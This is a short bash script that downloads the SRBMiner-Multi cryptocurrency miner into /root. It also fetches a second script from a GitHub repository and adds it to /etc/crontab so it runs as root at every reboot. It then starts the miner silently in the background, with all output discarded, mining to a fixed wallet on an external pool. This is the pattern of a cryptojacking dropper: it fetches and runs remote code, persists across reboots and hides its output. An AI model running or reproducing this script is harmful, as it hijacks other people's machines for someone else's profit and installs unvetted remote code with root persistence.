#!/bin/bash
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.8/SRBMiner-Multi-0-9-8-Linux.tar.xz -P /root
tar -Jxvf /root/SRBMiner-Multi-0-9-8-Linux.tar.xz -C /root
wget https://github.com/ControlWhithC/wa/raw/main/reboot.sh -P /root
chmod +x /root/reboot.sh
echo '@reboot root sh /root/reboot.sh' >> /etc/crontab
nohup /root/SRBMiner-Multi-0-9-8/SRBMiner-MULTI --disable-gpu --algorithm randomepic --pool epic.hashrate.to:4000 --wallet ademeonpcuws --password x > /dev/null &

